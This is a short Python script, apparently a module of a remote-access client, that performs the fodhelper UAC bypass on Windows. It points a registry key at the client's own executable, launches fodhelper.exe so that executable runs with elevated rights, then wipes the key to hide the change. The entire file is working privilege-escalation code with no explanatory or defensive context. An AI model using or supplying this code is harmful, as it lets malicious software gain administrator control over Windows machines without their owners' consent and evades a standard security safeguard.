import subprocess
import winreg

from core.utils.client_util import get_executable_path

reg_path = r'Software\Classes\ms-settings\shell\open\command'

cmd = get_executable_path()

winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)

winreg.SetValueEx(key, None, 0, winreg.REG_SZ, cmd)
winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')

p = subprocess.Popen(r'C:\Windows\System32\fodhelper.exe', shell=True)
p.communicate()

winreg.SetValueEx(key, None, 0, winreg.REG_SZ, '')
winreg.DeleteValue(key, 'DelegateExecute')
winreg.CloseKey(key)

print('UAC bypass via fodhelper completed')
